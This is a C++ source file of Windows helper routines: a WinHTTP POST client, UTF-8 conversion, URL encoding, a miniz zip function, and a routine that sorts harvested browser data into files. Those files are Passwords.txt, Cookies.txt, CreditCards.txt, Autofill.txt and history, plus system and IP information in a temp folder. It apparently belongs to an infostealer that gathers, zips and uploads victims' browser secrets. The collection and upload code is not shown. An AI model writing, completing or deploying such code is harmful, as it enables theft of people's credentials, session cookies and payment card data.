#include "Utilities.h"

#include <windows.h>
#include <filesystem>
#include <sstream>
#include <iostream>
#include <vector>
#include <format>
#include <shellapi.h>

#include "miniz.h"

namespace fs = std::filesystem;

HTTPResponse WinHTTPClient::post(const std::wstring& host,
    const std::wstring& path,
    const std::wstring& headers,
    const std::string& data) {
    HTTPResponse response{ false, 0, {} };
    WinHTTPHandle session(WinHttpOpen(L"UserAgent/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0));
    if (!session) return response;

    WinHTTPHandle connect(WinHttpConnect(session.get(), host.c_str(),
        INTERNET_DEFAULT_HTTPS_PORT, 0));
    if (!connect) return response;

    WinHTTPHandle request(WinHttpOpenRequest(connect.get(),
        L"POST",
        path.c_str(),
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE));
    if (!request) return response;

    LPCWSTR hdrs = headers.empty() ? WINHTTP_NO_ADDITIONAL_HEADERS : headers.c_str();
    DWORD hdrsLen = headers.empty() ? 0 : static_cast<DWORD>(wcslen(headers.c_str()));
    if (!WinHttpSendRequest(request.get(),
        hdrs,
        hdrsLen,
        (LPVOID)data.data(),
        static_cast<DWORD>(data.size()),
        static_cast<DWORD>(data.size()),
        0)) {
        return response;
    }

    if (!WinHttpReceiveResponse(request.get(), nullptr)) {
        return response;
    }

    DWORD statusCode = 0;
    DWORD size = sizeof(statusCode);
    if (!WinHttpQueryHeaders(request.get(),
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        nullptr, &statusCode, &size, nullptr)) {
        return response;
    }

    response.statusCode = statusCode;
    std::string body;
    while (true) {
        DWORD bytesAvailable = 0;
        if (!WinHttpQueryDataAvailable(request.get(), &bytesAvailable)) break;
        if (bytesAvailable == 0) break;
        std::vector<char> buffer(bytesAvailable + 1, 0);
        DWORD bytesRead = 0;
        if (!WinHttpReadData(request.get(), buffer.data(), bytesAvailable, &bytesRead)) break;
        body.append(buffer.data(), bytesRead);
    }

    response.body = body;
    response.success = (statusCode >= 200 && statusCode < 300);
    return response;
}

std::wstring stringToWString(const std::string& str) {
    if (str.empty()) return std::wstring();
    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, str.c_str(),
        static_cast<int>(str.length()), nullptr, 0);
    std::wstring wstr(sizeNeeded, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(),
        static_cast<int>(str.length()), &wstr[0], sizeNeeded);
    return wstr;
}

std::string wstringToString(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(),
        static_cast<int>(wstr.length()),
        nullptr, 0, nullptr, nullptr);
    std::string str(sizeNeeded, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(),
        static_cast<int>(wstr.length()), &str[0], sizeNeeded,
        nullptr, nullptr);
    return str;
}

std::wstring trim(const std::wstring& s) {
    size_t start = s.find_first_not_of(L" \t\n\r");
    if (start == std::wstring::npos) return L"";
    size_t end = s.find_last_not_of(L" \t\n\r");
    return s.substr(start, end - start + 1);
}

std::string urlEncode(const std::wstring& value) {
    std::string encoded;
    for (wchar_t wc : value) {
        if ((wc >= L'0' && wc <= L'9') ||
            (wc >= L'A' && wc <= L'Z') ||
            (wc >= L'a' && wc <= L'z') ||
            wc == L'-' || wc == L'_' || wc == L'.' || wc == L'~') {
            encoded += static_cast<char>(wc);
        }
        else if (wc == L' ') {
            encoded += '+';
        }
        else {
            char buffer[4];
            sprintf_s(buffer, "%%%02X", static_cast<unsigned char>(wc));
            encoded += buffer;
        }
    }
    return encoded;
}

bool compressDirectoryToZip(const std::wstring& folderPath, const std::wstring& zipPath) {
    try {
        mz_zip_archive zip;
        memset(&zip, 0, sizeof(zip));

        if (!mz_zip_writer_init_file(&zip, wstringToString(zipPath).c_str(), 0)) {
            return false;
        }

        for (auto& entry : fs::recursive_directory_iterator(folderPath)) {
            if (!entry.is_directory()) {
                auto filePath = entry.path();
                auto relativePath = fs::relative(filePath, folderPath).wstring();
                std::string filePathStr = wstringToString(filePath.wstring());
                std::string relativePathStr = wstringToString(relativePath);

                mz_bool status = mz_zip_writer_add_file(
                    &zip, relativePathStr.c_str(),
                    filePathStr.c_str(), nullptr, 0,
                    MZ_DEFAULT_COMPRESSION);

                if (!status) {
                    mz_zip_writer_end(&zip);
                    return false;
                }
            }
        }

        mz_zip_writer_finalize_archive(&zip);
        mz_zip_writer_end(&zip);
        return true;
    }
    catch (...) {
        return false;
    }
}

std::wstring saveDataToDirectory(
    const std::unordered_map<std::wstring, std::unordered_map<std::wstring, std::wstring>>& collectedData)
{
    wchar_t tempPath[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempPath) == 0) {
        throw std::runtime_error("Failed to get temporary path.");
    }

    wchar_t tempDirName[MAX_PATH];
    if (GetTempFileNameW(tempPath, L"brws", 0, tempDirName) == 0) {
        throw std::runtime_error("Failed to create temporary directory.");
    }

    DeleteFileW(tempDirName);
    if (!CreateDirectoryW(tempDirName, nullptr)) {
        throw std::runtime_error("Failed to create temporary directory.");
    }

    std::wstring tempDir(tempDirName);

    std::wstring systemInfoFolder = tempDir + L"\\System Information";
    if (!CreateDirectoryW(systemInfoFolder.c_str(), nullptr)) {
    }

    std::wstring systemInfoContent;
    for (const auto& [header, dataTypes] : collectedData) {
        if (header == L"Windows User"
            || header == L"System Information"
            || header == L"IP Address Information") {
            if (dataTypes.find(L"Content") != dataTypes.end() && !dataTypes.at(L"Content").empty()) {
                systemInfoContent += dataTypes.at(L"Content") + L"\n";
            }
            continue;
        }

        std::wstring browserFolder = tempDir + L"\\" + header;
        if (!CreateDirectoryW(browserFolder.c_str(), nullptr)) {
            continue;
        }

        for (const auto& [dataType, content] : dataTypes) {
            std::wstring trimmedContent = trim(content);
            if (trimmedContent.empty()) {
                continue;
            }

            std::wstring fileName;
            if (dataType.find(L"Bookmarks") != std::wstring::npos) {
                fileName = L"Bookmarks.txt";
            }
            else if (dataType.find(L"History") != std::wstring::npos) {
                fileName = L"History.txt";
            }
            else if (dataType.find(L"SearchHistory") != std::wstring::npos) {
                fileName = L"SearchHistory.txt";
            }
            else if (dataType.find(L"Downloads") != std::wstring::npos) {
                fileName = L"Downloads.txt";
            }
            else if (dataType.find(L"Passwords") != std::wstring::npos) {
                fileName = L"Passwords.txt";
            }
            else if (dataType.find(L"Cookies") != std::wstring::npos) {
                fileName = L"Cookies.txt";
            }
            else if (dataType.find(L"Credit Cards") != std::wstring::npos) {
                fileName = L"CreditCards.txt";
            }
            else if (dataType.find(L"Autofill") != std::wstring::npos) {
                fileName = L"Autofill.txt";
            }
            else {
                fileName = L"Other.txt";
            }

            std::wstring fullPath = browserFolder + L"\\" + fileName;
            std::ofstream outFile(fullPath, std::ios::out | std::ios::trunc | std::ios::binary);
            if (outFile) {
                std::string utf8Content = wstringToString(trimmedContent);
                outFile.write(utf8Content.c_str(), utf8Content.size());
                outFile.close();
            }
        }
    }

    if (!systemInfoContent.empty()) {
        std::wstring basicPath = systemInfoFolder + L"\\Basic.txt";
        std::ofstream basicFile(basicPath, std::ios::out | std::ios::trunc | std::ios::binary);
        if (basicFile) {
            std::string utf8SystemInfo = wstringToString(systemInfoContent);
            basicFile.write(utf8SystemInfo.c_str(), utf8SystemInfo.size());
            basicFile.close();
        }
    }

    return tempDir;
}
